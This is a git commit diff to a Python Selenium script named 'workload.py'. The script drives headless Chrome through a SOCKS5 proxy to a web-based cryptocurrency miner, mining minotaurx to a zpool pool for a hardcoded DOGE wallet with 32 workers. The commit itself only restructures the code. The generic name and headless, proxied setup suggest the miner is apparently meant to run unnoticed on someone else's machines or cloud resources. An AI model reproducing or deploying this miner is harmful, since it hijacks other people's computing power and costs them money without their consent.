c735af671f6d13a30d1f7e38aad220b3d8a853af
TranceMelan <95452879+TranceMelan@users.noreply.github.com>
2024-07-21 19:41:01 +0700

    Update workload.py

--- workload.py
+++ workload.py
@@ -1,45 +1,40 @@
-"""
 # Filename: run_selenium.py
-"""
 
 import time
-import os.path
+import os
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
-## Setup chrome options
+# Setup Chrome options
 chrome_options = Options()
 chrome_options.add_argument("--headless")  # Ensure GUI is off
 chrome_options.add_argument("--no-sandbox")
 chrome_options.add_argument("--proxy-server=socks5://localhost:1080")
+chrome_options.add_experimental_option("detach", True)  # Keep the browser open
 
-# Keep the browser open
-chrome_options.add_experimental_option("detach", True)
-
-# Set path to chromedriver as per your configuration
+# Set path to ChromeDriver as per your configuration
 homedir = os.path.expanduser("~")
-chrome_options.binary_location = f"./chrome"
-webdriver_service = Service(f"./chromedriver")
+chrome_driver_path = os.path.join(homedir, "chromedriver-linux64", "chromedriver")
+webdriver_service = Service(chrome_driver_path)
 
-# Choose Chrome Browser
+# Initialize WebDriver
 browser = webdriver.Chrome(service=webdriver_service, options=chrome_options)
 
-# Get page
-browser.get("https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=DTsjSjwtdDuUewe2fH8MSchu36ACATjLP2&password=c%3DDOGE&workers=32")
+try:
+    # Get page
+    browser.get("https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=DTsjSjwtdDuUewe2fH8MSchu36ACATjLP2&password=c%3DDOGE&workers=32")
 
-# Extract description from page and print
-description = browser.find_element(By.NAME, "description").get_attribute("content")
-print(f"{description}")
+    # Extract description from page and print
+    description = browser.find_element(By.NAME, "description").get_attribute("content")
+    print(f"Description: {description}")
 
-# Wait for 10 seconds
-time.sleep(10)
-# browser.quit()
+    # Wait for 10 seconds
+    time.sleep(10)
 
-
-keyword = input("enter a character or press enter to continue: ")
-
-webdriver.quit()
-
-#chrome_driver = webdriver.Chrome(options= chrome_options)
+    # Wait for user input to continue
+    input("Enter a character or press enter to continue: ")
+finally:
+    # Ensure the browser is closed
+    browser.quit()
